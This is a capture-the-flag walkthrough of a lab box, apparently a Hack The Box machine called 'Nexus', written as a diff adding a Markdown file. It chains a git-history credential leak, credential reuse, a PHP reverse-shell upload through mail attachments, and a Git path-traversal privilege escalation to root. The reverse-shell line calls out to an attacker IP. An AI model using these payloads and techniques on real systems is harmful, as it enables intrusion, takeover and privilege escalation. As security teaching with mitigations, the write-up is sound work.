@@ -1,0 +1,354 @@
+# HTB "Nexus" — Full Walkthrough
+
+**Author:** pytha90ras
+**Difficulty:** Easy
+**Category:** Web Exploitation → Privilege Escalation
+**Chain:** Vhost Fuzzing → Git Commit History Secret Leak → Credential Reuse (CRM Login) → File-Upload Filter Bypass via Mail Attachments → RCE → SSH Credential Reuse → Gitea Template-Sync Path Traversal (Root)
+
+> A quick note on how this one was solved: recon through the initial `www-data` foothold and the SSH pivot to `jones` (Sections 1–9) were done independently. The privilege escalation stage (Section 10) is one I completed with the help of a walkthrough — crafting raw Git objects by hand to smuggle a path-traversal payload past Git's own path validation wasn't something I'd done before, and I didn't want to fake having figured it out solo.
+I've rebuilt that section in my own words and explained *why* each step works rather than just copying commands, but credit where it's due: I didn't get here alone. If you're following along, replace every IP, port, username, email, and cookie value with your own.
+
+---
+
+## 0. Recon — Nmap
+
+```bash
+# Step 1: quick scan of all ports, only show open ones
+nmap -p- --open 10.129.51.228
+
+# Step 2: version/script detection on just the open ports
+nmap -p22,80 -sCV -vvv 10.129.51.228
+```
+
+Only two ports open: **22 (SSH)** and **80 (HTTP)**. Nothing unusual yet — standard "web app is the way in" setup.
+
+---
+
+## 1. Initial Web Enumeration — Dead Ends First
+
+Visiting the target's IP directly triggered a **redirect to `nexus.htb`** — the first clue this box expected a proper hostname, not just an IP. Added the domain to `/etc/hosts` and revisited:
+
+```bash
+echo "10.129.51.228  nexus.htb" | sudo tee -a /etc/hosts
+```
+
+Read through the site manually — no search box, no obvious input fields to poke at. A **"careers"** section listed a contact name and email for the hiring manager:
+
+```
+j.matthew@nexus.htb
+```
+
+Filed that away — named individuals' work emails are frequently reused as login identifiers elsewhere on the same organization's infrastructure, so it's worth holding onto even with nowhere to use it yet.
+
+From there, standard enumeration — all of which came back empty:
+
+- **Reading page source** for comments, hidden endpoints, JS references — nothing.
+- **Browser dev tools / network tab** — no interesting requests.
+
+Two dead ends in a row on the main vhost. Time to check whether there's more to this target than one website.
+
+## 2. Directory bruteforcing
+Checked to see if there are hidden paths which no request is being made to from the current page we have, gobuster is okay for this:
+gobuster dir -u http://nexus.htb -w /usr/share/dirb/wordlists/common.txt
+Again, we found nothing
+
+---
+
+## 3. Subdomain / Vhost Enumeration
+
+Since the main site was a wall, the next move was checking whether other sites were hiding behind the same IP — same idea as fuzzing the `Host` header to see what a server responds to beyond the one hostname you already know:
+
+```bash
+feroxbuster -u http://10.129.51.228/ \
+  -H "Host: FUZZ.nexus.htb" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+  --filter-status 400,404
+```
+
+Two hits: **`git`** and **`billing`**.
+
+Added both to `/etc/hosts`:
+
+```bash
+echo "10.129.51.228  billing.nexus.htb git.nexus.htb" | sudo tee -a /etc/hosts
+```
+
+---
+
+## 4. Billing Subdomain — More Dead Ends
+
+`billing.nexus.htb` redirected straight to `/admin/login`. Tried the obvious things first:
+
+- A handful of standard SQL injection payloads in the email/password fields — nothing.
+- `j.matthew@nexus.htb` (the hiring manager's email from earlier) with common/guessed passwords — nothing.
+- `admin@nexus.htb` as a guessable default — nothing.
+- Checked page source for hints — nothing, I deduced from here that the website runs on PHP though.
+
+No foothold here yet, but a login form asking for an **email** (not a username) is a detail worth remembering — it becomes relevant again once real credentials show up.
+
+---
+
+## 5. Git Subdomain — The Actual Leak
+
+`git.nexus.htb` hosted a browsable repository. Read through the tracked files, including the current `.env` — and noticed something specific: the **`DB_PASSWORD` field was present but empty** in the latest version.
+An empty-but-named field like that is a strong signal a real value used to be there and was deliberately scrubbed — which raised an obvious question: scrubbed from the *latest* commit, or from the repo's entire history?
+
+Checked the commit history, and found a past commit where that same field still held a real value:
+
+```
+DB_USERNAME=krayin
+DB_PASSWORD=<placeholder>
+```
+
+(`krayin` is the actual product name here — Krayin is an open-source, Laravel-based CRM, which lines up with the billing panel we found earlier)
+
+**Why this matters:** deleting a secret from the latest commit does not remove it from the repository's history — anyone who can browse or clone the repo can walk backward through every prior commit and find it.
+This is exactly the class of bug behind real incidents like Toyota's 2022 breach, where an access key sat exposed in commit history for years.
+
+---
+
+## 6. Credential Reuse — Into the Billing Panel
+
+Two loose threads so far: a hiring manager's **email** (billing's login form wants an email), and a **password** leaked from Git history (for a *database* user, not necessarily this login). Worth trying them together:
+
+```
+Email:    j.matthew@nexus.htb
+Password: <the one recovered from Git history>
+```
+
+**It worked.** The database password had been reused as the login password for j.matthew@nexus.htb — the same "credential reused across a trust boundary" pattern that shows up constantly in real breaches, just here it's a DB credential doing double duty as a web login instead of the more classic DB-password-as-SSH-password pattern.
+
+---
+
+## 7. Looking for a Foothold as Admin
+
+Logged into the Krayin CRM admin panel as `j.matthew@nexus.htb`. Went through every page systematically looking for functionality that touches the filesystem — the natural target once you're authenticated. The **configuration page → logo upload** stood out immediately: since the stack was already confirmed as PHP, an image upload field is the obvious first thing to try for a web shell.
+
+### 7.1 Upload Attempt #1 — Blocked
+
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.17.12/4444 0>&1'");
+```
+
+- Uploaded directly as `rev_shell.php` → **rejected immediately**, filetype must be an image.
+- Renamed the same file to `rev_shell.jpg` and uploaded through Burp with the request intercepted → **accepted** by the initial check.
+- With the request still caught in Burp before it was forwarded, changed the filename extension back to `.php` and the `Content-Type` header to `application/x-httpd-php`, then forwarded it.
+- Nothing interesting came back — no error, but no usable file path either, and the uploaded file wasn't reachable anywhere.
+
+Dead end — this particular upload path had real server-side validation beyond just trusting the client-supplied filename/content-type, not just a cosmetic extension check.
+
+### 7.2 The Real Upload Path — Mail Attachments
+
+Kept enumerating rather than pushing further on the logo uploader, and found a **mail feature** with an attachment field on the compose form. Rather than starting a fresh bypass attempt from scratch, the natural move was to try the **exact same crafted file** that had just failed against the logo endpoint — same `.jpg`-renamed file, same Burp interception flipping the extension back to `.php` and the `Content-Type` to `application/x-httpd-php` mid-request. If the logo uploader and the mail uploader validated files differently, reusing the identical payload would make that difference obvious.
+
+Set up a listener first:
+
+```bash
+nc -lvnp 4444
+```
+
+Composed a new email, attached the renamed `.jpg` payload, and sent it. With the request caught in Burp before it went out, changed the filename extension back to `.php` and the `Content-Type` header back to `application/x-httpd-php`, exactly as before, then forwarded it.
+
+This time it worked — same exact bypass technique, but the mail endpoint's server-side validation turned out to be weaker (or absent) compared to the logo uploader's. The response also gave back more than the logo endpoint ever had: it **echoed back the stored path of the uploaded file** on the server:
+
+```
+http://billing.nexus.htb/storage/emails/<PLACEHOLDER_PATH>/rev_shell.php
+```
+
+With the listener already running, navigated directly to that returned path in the browser — the PHP executed server-side and a reverse shell landed as **`www-data`**.
+
+---
+
+## 8. Stabilizing the Shell
+
+```bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
+```
+
+```
+Ctrl+Z
+stty raw -echo; fg
+```
+
+Followed by `export TERM=xterm` once back in the foreground shell, for proper coloring and a working `clear`.
+
+---
+
+## 9. Pivoting to a Real User
+
+Standard loot-hunting from `www-data`:
+Ran ls -al, saw a .env file
+```bash
+cat .env
+```
+sitting in there in plaintext is a password
+
+Also spotted a bcrypt hash (`$2y$10$...`) sitting in `database/factories/UserFactory.php`.
+
+Checked `/home` and found two real users: **`jones`** and **`git`**. Tried the password recovered from `.env` against SSH for `jones`:
+
+```bash
+ssh jones@nexus.htb
+```
+
+**It worked** — the same credential-reuse pattern as before, now stretching from a Git-leaked DB password → CRM login → SSH access for a real system user.
+Grabbed the user flag from `jones`'s home directory.
+
+---
+
+## 10. Privilege Escalation — Gitea Template Sync Path Traversal
+
+### 10.1 The Usual Checks First
+
+```bash
+sudo -l
+```
+Nothing — `jones` has no sudo rights.
+
+Searched for anything owned by `jones` outside normal system paths, and separately poked at a couple of root-owned directories (`/srv`, `/snap`) that stood out — nothing usable in either.
+
+```bash
+uname -a
+```
+Kernel came back current/patched — no kernel exploit path here, unlike some other boxes in this series.
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+SUID bit set on the usual suspects only (`passwd`, `su`, `sudo`, `mount`, `chsh`, `gpasswd`, etc.) — nothing custom or obviously abusable.
+
+### 10.2 The Actual Lead — Scheduled Tasks
+*(This section — everything from here to root — is the part I completed with a walkthrough. I'm explaining it the way I'd explain any other step in this writeup, but I want to be upfront that the core exploit technique wasn't something I derived myself.)*
+
+```bash
+systemctl list-timers
+```
+
+This revealed a **systemd timer** firing every couple of minutes: `gitea-template-sync.timer`, triggering `gitea-template-sync.service`.
+
+Reading the script it runs, `/etc/gitea/template-sync.py`:
+
+- The script clones every repository marked as a **template** in the box's self-hosted Gitea instance.
+- For each file Git reports via `git ls-tree`, it writes that file into a staging directory: `/home/git/template-staging/<owner>/<repo>/`.
+- Critically, it builds the destination path like this:
+
+  ```python
+  target = os.path.join(stage_path, filepath)
+  os.makedirs(os.path.dirname(target), exist_ok=True)
+  ```
+
+**The bug:** `filepath` comes straight from `git ls-tree` with zero sanitization, and `os.path.join()` will happily resolve `..` sequences in whatever path it's given. If a tracked file's path contains `../../../../../root/.ssh/authorized_keys`, this script will write to exactly that location — and it runs as a privileged user capable of writing into `/root/.ssh/`.
+
+**The catch:** you can't just `git mv` a file to a path containing `..` through normal Git operations — Git's own tooling (`verify_path()`) rejects path components like `..` when you try to add or commit a file that way. So the traversal has to be smuggled in at a lower level than Git's own safety checks.
+
+### 10.3 Bypassing Git's Path Validation
+
+Git ultimately stores everything as objects — blobs (file contents), trees (directory listings, mapping names to blobs/other trees), and commits (pointers to a root tree). The `..` restriction lives in Git's *porcelain* (the CLI commands like `git add`/`git mv`) — but if you construct the underlying tree/blob/commit objects directly and write them straight into `.git/objects/`, that validation layer is never invoked at all. Git will still faithfully read back whatever tree structure you built by hand, `..` components included, because nothing downstream re-validates what's already been committed.
+
+**Step 1 — generate an SSH keypair locally**, to install as our own access once we can write to `authorized_keys`:
+
+```bash
+ssh-keygen -t ed25519 -f /tmp/.k -N ''
+```
+
+**Step 2 — create a new repo in Gitea and mark it as a template**, so the sync script will pick it up. Named it `rce`, logged into Gitea as `jones` (same password recovered earlier).
+
+**Step 3 — clone it and add a normal file** (`README.md`) as cover.
+
+**Step 4 — hand-craft the malicious Git objects.** A custom `build.py` script builds this structure directly against Git's internal object format:
+
+- A blob containing our public key.
+- A tree entry named `authorized_keys` pointing at that blob, nested inside a tree named `.ssh`, nested inside a tree named `root`.
+- **Five** nested `..` tree entries wrapping around that `root/.ssh/authorized_keys` structure — enough traversal to escape from the script's staging path (`/home/git/template-staging/jones/rce/`) all the way up to `/root/`.
+- A root tree combining the normal `README.md` entry with the first `..` entry, and a commit object pointing at that root tree.
+- The new commit is written as the `main` branch ref directly, then force-pushed — bypassing the normal commit flow (and its path validation) entirely.
+
+```bash
+python3 /tmp/build.py
+git push -u origin main --force
+```
+
+### 10.4 Waiting for the Timer
+
+The sync timer fires every couple of minutes regardless of what triggered the repo change — no need to do anything but wait. Confirmed it ran (and that the traversal actually worked) by tailing the script's own log:
+
+```
+[2026-03-05 18:04:00] Syncing template: jones/rce
+[2026-03-05 18:04:00] synced: README.md
+[2026-03-05 18:04:00] synced: ../../../../../root/.ssh/authorized_keys
+[2026-03-05 18:04:00] Template sync complete
+```
+
+That second `synced:` line is the whole vulnerability confirmed in one line of logging — the script itself is telling us it just wrote outside its intended directory.
+
+### 10.5 Root
+
+```bash
+ssh -i /tmp/.k root@nexus.htb
+```
+
+Straight into a root shell. Grabbed the root flag from `/root/root.txt`.
+
+---
+
+## 11. Vulnerabilities Found & How They Could Have Been Prevented
+
+### 1. Secrets Exposed in Git Commit History
+**Root cause:** Database credentials were committed to the repository at some point and later removed from the latest snapshot — but Git's history is permanent by default, so anyone who can clone or browse the repo can still recover them from an old commit.
+
+**Mitigation:** Treat any credential ever committed as permanently compromised — removing it from the latest commit is not remediation, only rotation is. Use pre-commit secret-scanning hooks and repository-wide secret scanners (e.g. Gitleaks, TruffleHog) in CI to catch this before it's ever pushed. Store credentials in environment variables or a secrets manager, never in tracked files, even temporarily.
+
+### 2. Credential Reuse
+**Root cause:** The same password protected a database connectio and a real system user's SSH access — completely different privilege contexts, one shared secret. A single leak cascaded across both.
+
+**Mitigation:** Unique, independently generated credentials per system and purpose, with no manual reuse between application config, web logins, and OS-level accounts. Disable password-based SSH for real user accounts in favor of key-based authentication.
+
+### 3. Inconsistent File-Upload Validation Across Features
+**Root cause:** The logo-upload feature enforced real server-side filetype validation; the mail-attachment feature, doing conceptually the same thing (accepting and storing a user-supplied file), enforced none. One inconsistently-secured feature undid the effort put into securing another.
+
+**Mitigation:** Centralize upload handling into a single, shared, strictly-validated code path (allowlist of extensions/MIME types, content inspection, storage outside the webroot, randomized filenames) used by *every* feature that accepts a file, rather than letting each feature reimplement its own checks independently.
+
+### 4. Unsanitized Path Construction in a Privileged Automation Script
+**Root cause:** `os.path.join()` was used on attacker-influenceable input (a file path pulled from a Git repository the attacker controlled) without stripping or rejecting `..` traversal sequences, and the script ran as a user with write access to `/root/`.
+
+**Mitigation:** Never trust a "safe join" function alone to prevent traversal — `os.path.join()` (and equivalents in other languages) is a path *combinator*, not a path *validator*. After building the target path, resolve it fully (`os.path.realpath()`) and explicitly verify the result still lives inside the intended base directory before writing anything. Additionally, this script should never have run with privileges capable of writing into `/root/` at all — least privilege for scheduled/automated tasks matters just as much as for human accounts.
+
+### 5. Application-Layer Validation Bypassed via Direct Manipulation of Underlying Data Format
+**Root cause:** Git's `..`-path protection lives in its CLI/porcelain layer, not in the underlying object storage format itself. Constructing raw tree/blob/commit objects and writing them directly into `.git/objects/` skips that protective layer entirely, because nothing re-validates already-committed history.
+
+**Mitigation:** This is a broader architectural lesson: a check enforced only at one entry point (the CLI) doesn't protect the underlying data format if that format can be manipulated directly. Consuming services (like this sync script) that trust "whatever's in the repository" without re-validating it themselves inherit this gap — the sync script needed its own independent path-safety check regardless of what Git's own tooling does or doesn't allow.
+
+---
+
+## Summary Chain
+
+```
+Recon (nmap: 22, 80 open)
+      ↓
+Main site dead ends → vhost fuzzing → found billing.nexus.htb + git.nexus.htb
+      ↓
+billing/admin login: SQLi + guesses → dead end
+      ↓
+git.nexus.htb commit history → leaked DB credentials
+      ↓
+Hiring manager's email + leaked password → billing CRM admin access
+      ↓
+Logo upload (.php blocked → .jpg+intercept bypass also blocked) → dead end
+      ↓
+Same crafted file reused against mail attachment endpoint → accepted → PHP RCE → www-data
+      ↓
+.env credentials → SSH as jones (credential reuse, 3rd time)
+      ↓
+sudo -l / SUID / kernel → all dead ends
+      ↓
+systemd timer → gitea-template-sync.py → unsanitized os.path.join()
+      ↓
+Raw Git object crafting (bypasses Git's own ".." validation) → authorized_keys written to /root/.ssh/
+      ↓
+SSH as root
+```
+
+---
+
+*Writeup by [pytha90ras](https://github.com/pytha90ras) — feel free to fork, adapt, or point out anything I got wrong. Privilege escalation section completed with walkthrough assistance; everything before it was solved independently.*
